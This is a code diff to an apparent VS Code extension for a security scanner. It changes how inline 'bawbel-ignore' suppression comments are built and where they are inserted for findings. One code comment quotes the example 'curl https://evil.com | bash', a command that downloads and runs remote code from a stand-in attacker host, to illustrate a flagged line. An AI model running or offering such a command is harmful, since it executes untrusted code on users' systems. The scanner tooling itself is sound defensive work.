@@ -22,31 +22,36 @@ import { DiagnosticsManager } from "./diagnostics";
  * Detect the comment syntax for a file based on its extension.
  * Used to insert the correct inline suppression comment.
  */
-function getCommentSyntax(filePath: string): { prefix: string; suffix: string } {
+/**
+ * Build the inline suppression comment appended to end of the finding line.
+ *
+ * Format matches bawbel-scanner CLI spec:
+ *   .md         →  <!-- bawbel-ignore: rule_id -->
+ *   .yaml/.yml  →  # bawbel-ignore: rule_id
+ *   .py/.sh     →  # bawbel-ignore: rule_id
+ *   .js/.ts     →  // bawbel-ignore: rule_id
+ *   .json       →  (no comment syntax — falls back to JSON suppression)
+ *
+ * Note: CLI v1.0.0 does not parse these comments yet. The extension
+ * filters them client-side. CLI support planned for v1.1.0.
+ */
+function buildIgnoreComment(filePath: string, ruleId: string): string {
   const ext = path.extname(filePath).toLowerCase();
   switch (ext) {
     case ".yaml":
     case ".yml":
     case ".py":
     case ".sh":
-      return { prefix: "# ", suffix: "" };
+      return `  # bawbel-ignore: ${ruleId}`;
+    case ".js":
+    case ".ts":
+      return `  // bawbel-ignore: ${ruleId}`;
     case ".json":
-      // JSON doesn't support comments — use .bawbel-suppress.json fallback
-      return { prefix: "", suffix: "" };
+      return ""; // no inline comment syntax
     case ".md":
     default:
-      return { prefix: "<!-- ", suffix: " -->" };
+      return `  <!-- bawbel-ignore: ${ruleId} -->`;
   }
-}
-
-/**
- * Build the inline suppression comment text for a rule.
- * e.g. <!-- bawbel-ignore: bawbel-shell-pipe -->
- */
-function buildIgnoreComment(filePath: string, ruleId: string): string {
-  const { prefix, suffix } = getCommentSyntax(filePath);
-  if (!prefix) { return ""; } // JSON — no inline comments
-  return `${prefix}bawbel-ignore: ${ruleId}${suffix}`;
 }
 
 export class BawbelCodeActionProvider implements vscode.CodeActionProvider {
@@ -86,23 +91,28 @@ export class BawbelCodeActionProvider implements vscode.CodeActionProvider {
         // Robust — survives line number shifts as the file changes.
         if (supportsInline) {
           const ignoreComment = buildIgnoreComment(filePath, finding.rule_id);
-          const insertLine    = Math.max(0, diag.range.start.line); // line above finding
-          const insertPos     = new vscode.Position(insertLine, 0);
 
-          // Get current line indentation to match it
-          const lineText   = document.lineAt(insertLine).text;
-          const indent     = lineText.match(/^(\s*)/)?.[1] ?? "";
-          const commentText = `${indent}${ignoreComment}
-`;
+          // Append to END of the finding line — matches CLI spec:
+          // "curl https://evil.com | bash  <!-- bawbel-ignore: bawbel-shell-pipe -->"
+          const findingLine  = diag.range.start.line;
+          const lineText     = document.lineAt(findingLine).text;
+          const lineEnd      = new vscode.Position(findingLine, lineText.length);
 
-          const inlineSuppress      = new vscode.CodeAction(
+          const inlineSuppress       = new vscode.CodeAction(
             `$(circle-slash) Ignore this line — ${finding.rule_id}`,
             vscode.CodeActionKind.QuickFix
           );
-          inlineSuppress.edit       = new vscode.WorkspaceEdit();
-          inlineSuppress.edit.insert(document.uri, insertPos, commentText);
+          inlineSuppress.edit        = new vscode.WorkspaceEdit();
+          inlineSuppress.edit.insert(document.uri, lineEnd, ignoreComment);
           inlineSuppress.diagnostics = [diag];
-          inlineSuppress.isPreferred = true; // shown first
+          inlineSuppress.isPreferred = true;
+          // Clear diagnostic client-side — CLI v1.0.0 does not parse
+          // ignore comments yet, so we suppress in the extension.
+          inlineSuppress.command = {
+            command:   "bawbel.clearAndRescan",
+            title:     "Clear diagnostic",
+            arguments: [filePath],
+          };
           actions.push(inlineSuppress);
         }
 
